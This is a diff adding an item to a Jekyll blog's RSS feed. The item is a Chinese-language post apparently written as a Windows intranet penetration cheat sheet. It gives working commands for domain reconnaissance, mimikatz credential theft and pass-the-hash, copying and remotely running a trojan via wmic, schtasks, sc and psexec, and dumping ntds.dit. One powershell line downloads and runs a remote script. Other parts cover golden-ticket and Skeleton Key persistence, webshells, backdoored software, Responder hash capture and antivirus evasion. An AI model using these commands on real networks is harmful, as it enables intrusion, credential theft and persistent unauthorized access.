@@ -1,13 +1,292 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
-    <title>Tomato's Blog'</title>
+    <title>Tomato's Blog</title>
     <description>Something Specail</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Mon, 20 Mar 2017 12:58:04 +0800</pubDate>
-    <lastBuildDate>Mon, 20 Mar 2017 12:58:04 +0800</lastBuildDate>
+    <pubDate>Mon, 20 Mar 2017 13:51:38 +0800</pubDate>
+    <lastBuildDate>Mon, 20 Mar 2017 13:51:38 +0800</lastBuildDate>
     <generator>Jekyll v3.4.2</generator>
+    
+      <item>
+        <title>windows内网渗透杂谈</title>
+        <description>&lt;h1 id=&quot;windows内网渗透杂谈&quot;&gt;windows内网渗透杂谈&lt;/h1&gt;
+&lt;hr /&gt;
+&lt;h3 id=&quot;域渗透&quot;&gt;域渗透&lt;/h3&gt;
+&lt;ol&gt;
+  &lt;li&gt;域信息收集&lt;/li&gt;
+  &lt;li&gt;获取域权限&lt;/li&gt;
+  &lt;li&gt;dump域hash&lt;/li&gt;
+  &lt;li&gt;权限维持&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;工作组渗透&quot;&gt;工作组渗透&lt;/h3&gt;
+&lt;ol&gt;
+  &lt;li&gt;常规内网渗透&lt;/li&gt;
+  &lt;li&gt;各种欺骗攻击&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;域渗透-1&quot;&gt;域渗透&lt;/h2&gt;
+&lt;h3 id=&quot;域信息收集&quot;&gt;域信息收集&lt;/h3&gt;
+&lt;h4 id=&quot;0x01-查询当前域信息&quot;&gt;0x01 查询当前域信息&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net view /domain
+net config workstation
+net group &quot;Domain Admins&quot; /domain
+net time /domain
+ipconfig /all
+nslookup xxx
+dsquery server
+
+查看域控制器
+net group &quot;Domain controllers&quot;
+
+查询所有计算机名称(windows 2003)
+
+dsquery computer
+
+下面这条查询的时候,域控不会列出
+
+net group &quot;Domain Computers&quot; /domain
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816910178725.jpg&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816926950901.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;还可以通过powershell进行信息搜集,收集的信息包括域控机器，网段信息，域内服务列表。使用powershell的话，首先要绕过默认的安全策略，具体看文章&lt;a href=&quot;https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/&quot;&gt;https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PowerSploit\Recon\PowerView.ps1&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;powerview Get-NetDomainController  收集域控信息
+具体的可以看看powerview的帮助文件
+域内服务信息收集，在域环境中其实无需做端口扫描。直接通过SPN进行信息收集，具体脚本&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PowerShell-AD-Recon/blob/master/Discover-PSInterestingServices.ps1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816932370016.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;0x02域内权限获取&quot;&gt;0x02域内权限获取&lt;/h4&gt;
+
+&lt;p&gt;1.日常规服务，通过前面收集的服务信息，针对性跑这些服务。其中跑sqlserver弱口令比较好，跑出来了就可以执行命令。&lt;/p&gt;
+
+&lt;p&gt;2.抓密码 拿到一台域服务器后，首先加载mimikatz的powershell脚本将内置的信息抓取一遍，如果域管理员登录过的话，直接就获取到了域管权限。但是在windows2012后mimikatz抓不到明文了(包括打了KB2871997这个补丁的机器)，只能通过修改服务器上面的一些设置来获取，有完整的powershell利用脚本。
+&lt;a href=&quot;https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed&quot;&gt;https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;3.pass the hash 抓到密码破不出来就只能pth了，可以使用mimakatz&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz # sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;但是打了KB2871997这个补丁后常规的pth不能用了，只能传递administrator这个账号(sid=500),但是可以使用mimikatz任意传递aes256&lt;/p&gt;
+
+&lt;p&gt;4.steal token
+当你获取了本地计算机的system权限后，如果这台机器上有域用户跑的进程，就直接可以窃取域账号的token，然后从本地用户组跨入域环境。如果这台机器上有域管的开的进程，那么直接steal token后就可以登录域控了。
+&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816940742419.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;5.远程执行命令方法&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;copy muma.exe \\host\c$\windows\temp\foobar.exe ##IPC拷贝木马文件
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;WMIC远程运行命令&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+wmic /node:host /user:administrator /p 密码 process call create “c:\windows\temp\foobar.exe”
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;powershell remoting 执行命令&lt;/p&gt;
+
+&lt;p&gt;schtasks计划任务远程运行&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe
+/sc once /st 00:00 /S host /RU System schtasks /run /tn foobar /S host
+schtasks /F /delete /tn foobar /S host ##清除schtasks
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;SC添加服务远程运行命令&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sc \\host create foobar binpath=“c:\windows\temp\foobar.exe” ##新建服务,指向拷贝的木马路径
+sc \\host start foobar ##启动建立的服务
+sc \\host delete foobar ##完事后删除服务
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;PStools 远程执行命令&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;psexec.exe \\ip –accepteula -u username -p password program.exe
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;PTH+compmgmt.msc
+&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816949000256.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;smb+MOF&lt;/p&gt;
+
+&lt;p&gt;smbexec远程执行命令&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;copy execserver.exe \\host\c$\windows\ 
+test.exe ip user password command netshare
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;不推荐使用pstools，因为会留下很多痕迹，日志要记录，并且如果禁用NTLM那么psexec无法利用获得的ntlm hash进行远程连接&lt;/p&gt;
+
+&lt;p&gt;6.ms14068 &amp;amp;&amp;amp; GPP
+ms14068 可以通过先执行klist purge 然后在用mimikatz注入证书 这样域用户也可以直接使用这个漏洞。
+GPP漏洞介绍 &lt;a href=&quot;http://www.91ri.org/14909.html&quot;&gt;http://www.91ri.org/14909.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;0x03-dump域内hash&quot;&gt;0x03 dump域内hash&lt;/h4&gt;
+&lt;p&gt;1.非交互式
+QuarkPwDump离线分析
+需要文件：ntds.dit system.hiv
+导出 system.hiv&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reg save hklm\system system.hiv
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;QuarksPwDump.exe -k  可以获取key&lt;/p&gt;
+
+&lt;p&gt;导出ntds.dit&lt;/p&gt;
+
+&lt;p&gt;连接到域控之后，上传bat 利用vshadow备份ntds.dit&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;setlocal
+if NOT &quot;%CALLBACK_SCRIPT%&quot;==&quot;&quot; goto :IS_CALLBACK
+set SOURCE_DRIVE_LETTER=%SystemDrive%
+set SOURCE_RELATIVE_PATH=\windows\ntds\ntds.dit
+set DESTINATION_PATH=%~dp0
+@echo ...Determine the scripts to be executed/generated...
+set CALLBACK_SCRIPT=%~dpnx0
+set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd
+@echo ...Creating the shadow copy...
+&quot;%~dp0vshadow-2008-x64.exe&quot; -script=%TEMP_GENERATED_SCRIPT% -exec=&quot;%CALLBACK_SCRIPT%&quot; %SOURCE_DRIVE_LETTER%
+del /f %TEMP_GENERATED_SCRIPT%
+@goto :EOF
+:IS_CALLBACK
+setlocal
+@echo ...Obtaining the shadow copy device name...
+call %TEMP_GENERATED_SCRIPT%
+@echo ...Copying from the shadow copy to the destination path...
+copy &quot;%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH%
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;新建服务执行&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sc create backupntds binPath= &quot;cmd /c start c:\windows\temp\ntds.bat&quot;
+sc start backupntds
+sc detele backupntds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;导出HASH&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QuarksPwDump.exe -dhd -nt ntds.dit -sf system.hiv -o hash.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;ntdsutil导出&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit
+ntdsutil snapshot &quot;mount {GUID}&quot; quit quit
+copy MOUNT_POINT\windows\ntds\ntds.dit c:\windows\temp\ntds.dit
+ntdsutil snapshot &quot;unmount {GUID}&quot; quit quit
+ntdsutil snapshot &quot;delete {GUID}&quot; quit quit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;powershell 导出ntds.dit&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;powershell IEX (New-ObjectNet.WebClient).DownloadString( 'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1');Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\Users\Administrator\Desktop\ntds.dit&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;powershell导出后需要修复一下&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;esentutl /p /o ntds.dit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;交互式&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;导出ntds.dit&lt;/p&gt;
+
+&lt;p&gt;windows2008之后可以使用ntdsutil&lt;/p&gt;
+
+&lt;h4 id=&quot;0x04权限维持&quot;&gt;0x04权限维持&lt;/h4&gt;
+&lt;ol&gt;
+  &lt;li&gt;golden ticket
+golden ticket 四要素&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user 用户名
+domain 域完整名称
+sid   获取方式:whoami /all  powerview 里面的  Convert-NameToSid ESRINEA\administrator   psgetsid  -accepteula ESRINEA\administrator (PStoos存在)   mimikatz SID::lookup name
+krbgt ntml hash   mimikatz “@lsadump::dcsync /domain:域完整名称 /user:krbtgt&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;保存golden ticket&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz kerberos::golden /user:administrator /domain:ESRINEA.LOCAL /sid:S-1-5-21-2609584263-878513794-3710365111-500 /krbtgt:EDC094659D9C18F4E320C70838404D43 /ticket:ESRINEA.LOCAL.kirbi
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;使用golden ticket&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz keberos::ptt ESRINEA.LOCAL.kirbi
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14817917650651.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;mimikatz Skeleton Key SSP
+Skeleton Key被安装在64位的域控服务器上，支持Windows Server2003—Windows Server2012 R2，能够让所有域用户使用同一个万能密码进行登录现有的所有域用户使用原密码仍能继续登录，重启后失效，使用mimikatz就可以安装。&lt;/li&gt;
+  &lt;li&gt;记录域控密码
+&lt;a href=&quot;https://gist.github.com/mubix/6514311#file-evilpassfilter-cpp&quot;&gt;https://gist.github.com/mubix/6514311#file-evilpassfilter-cpp&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;dump 域内所有hash&lt;/li&gt;
+  &lt;li&gt;常用软件插后门 https://github.com/secretsquirrel/the-backdoor-factory&lt;/li&gt;
+  &lt;li&gt;cobalt-strike-persistence
+&lt;a href=&quot;https://github.com/Tom4t0/cobalt-strike-persistence&quot;&gt;https://github.com/Tom4t0/cobalt-strike-persistence&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;EXCHANGE服务器留webshell&lt;/li&gt;
+  &lt;li&gt;控制一些vpn账号&lt;/li&gt;
+  &lt;li&gt;dump dns解析记录  dump ldap信息&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;工作组渗透-1&quot;&gt;工作组渗透&lt;/h2&gt;
+&lt;h2 id=&quot;常规内网渗透&quot;&gt;常规内网渗透&lt;/h2&gt;
+&lt;ol&gt;
+  &lt;li&gt;日服务&lt;/li&gt;
+  &lt;li&gt;pass the hash&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;各种欺骗攻击&quot;&gt;各种欺骗攻击&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/SpiderLabs/Responder&quot;&gt;https://github.com/SpiderLabs/Responder&lt;/a&gt;
+撸下内网一个网站挂上&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;img src=\\xxx\\xx&amp;gt;&lt;/code&gt;然后执行下面命令，就可以抓取ntlmv2 hash&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./Responder.py -I eth0 -rPv
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816996917145.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;SMBRelay Attack&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14817720462479.jpg&quot; alt=&quot;&quot; /&gt;
+impacket&lt;/p&gt;
+
+&lt;h3 id=&quot;cobaltstrike工具免杀&quot;&gt;cobaltstrike工具免杀&lt;/h3&gt;
+&lt;p&gt;cobaltstrike+veil&lt;/p&gt;
+
+</description>
+        <pubDate>Mon, 20 Mar 2017 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2017/03/20/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%9D%82%E8%B0%88.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2017/03/20/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%9D%82%E8%B0%88.html</guid>
+        
+        <category>pentest</category>
+        
+        
+      </item>
     
     </channel>
 </rss>
